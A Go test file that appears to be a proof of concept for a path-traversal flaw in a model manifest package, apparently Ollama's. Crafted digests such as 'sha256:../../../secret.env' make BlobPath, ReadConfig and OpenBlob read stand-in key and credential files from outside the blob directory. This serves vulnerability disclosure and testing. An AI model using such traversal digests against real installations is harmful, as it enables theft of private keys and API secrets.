package manifest

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPoC_BlobPath_ResolvesOutsideBlobDir(t *testing.T) {
	tmp := t.TempDir()
	blobDir := filepath.Join(tmp, "blobs")
	if err := os.MkdirAll(blobDir, 0o755); err != nil {
		t.Fatal(err)
	}

	secretContent := []byte("ssh-ed25519-private-key-bytes")
	secretPath := filepath.Join(tmp, "leaked.txt")
	if err := os.WriteFile(secretPath, secretContent, 0o600); err != nil {
		t.Fatal(err)
	}

	mm := &ModelManifest{BlobDir: blobDir}

	cases := []struct {
		name   string
		digest string
		want   string
	}{
		{
			name:   "control: valid sha256 digest stays inside BlobDir",
			digest: "sha256:" + strings.Repeat("a", 64),
			want:   filepath.Join(blobDir, "sha256-"+strings.Repeat("a", 64)),
		},
		{
			name:   "BUG: traversal digest escapes BlobDir to sibling file",
			digest: "sha256:../../../leaked.txt",
			want:   secretPath,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := mm.BlobPath(tc.digest)
			if filepath.Clean(got) != filepath.Clean(tc.want) {
				t.Errorf("BlobPath(%q) = %q, want %q", tc.digest, got, tc.want)
			} else {
				t.Logf("BlobPath(%q) -> %q", tc.digest, got)
			}
		})
	}
}

func TestPoC_ReadConfig_LFI_ViaTraversalDigest(t *testing.T) {
	tmp := t.TempDir()
	blobDir := filepath.Join(tmp, "blobs")
	if err := os.MkdirAll(blobDir, 0o755); err != nil {
		t.Fatal(err)
	}

	secretContent := []byte("OPENAI_API_KEY=sk-leaked-via-blobpath-traversal\n")
	secretPath := filepath.Join(tmp, "secret.env")
	if err := os.WriteFile(secretPath, secretContent, 0o600); err != nil {
		t.Fatal(err)
	}

	mm := &ModelManifest{
		BlobDir: blobDir,
		Manifest: &Manifest{
			SchemaVersion: 2,
			Layers: []ManifestLayer{
				{
					MediaType: "application/vnd.ollama.image.json",
					Name:      "model_index.json",
					Digest:    "sha256:../../../secret.env",
					Size:      int64(len(secretContent)),
				},
			},
		},
	}

	got, err := mm.ReadConfig("model_index.json")
	if err != nil {
		t.Fatalf("ReadConfig returned error: %v", err)
	}

	if string(got) != string(secretContent) {
		t.Errorf("ReadConfig returned wrong bytes:\n  got:  %q\n  want: %q", got, secretContent)
		return
	}
	t.Logf("LFI confirmed: ReadConfig leaked %d bytes from %s via traversal digest", len(got), secretPath)
}

func TestPoC_OpenBlob_LFI_ViaTraversalDigest(t *testing.T) {
	tmp := t.TempDir()
	blobDir := filepath.Join(tmp, "blobs")
	if err := os.MkdirAll(blobDir, 0o755); err != nil {
		t.Fatal(err)
	}

	keyContent := []byte("stand-in for the ollama identity key file\n")
	keyPath := filepath.Join(tmp, "id_ed25519")
	if err := os.WriteFile(keyPath, keyContent, 0o600); err != nil {
		t.Fatal(err)
	}

	mm := &ModelManifest{BlobDir: blobDir}

	rc, err := mm.OpenBlob("sha256:../../../id_ed25519")
	if err != nil {
		t.Fatalf("OpenBlob returned error: %v", err)
	}
	defer rc.Close()

	buf := make([]byte, 4096)
	n, _ := rc.Read(buf)
	got := buf[:n]

	if string(got) != string(keyContent) {
		t.Errorf("OpenBlob returned wrong bytes:\n  got:  %q\n  want: %q", got, keyContent)
		return
	}
	t.Logf("LFI confirmed: OpenBlob leaked %d bytes from %s via traversal digest", len(got), keyPath)
}
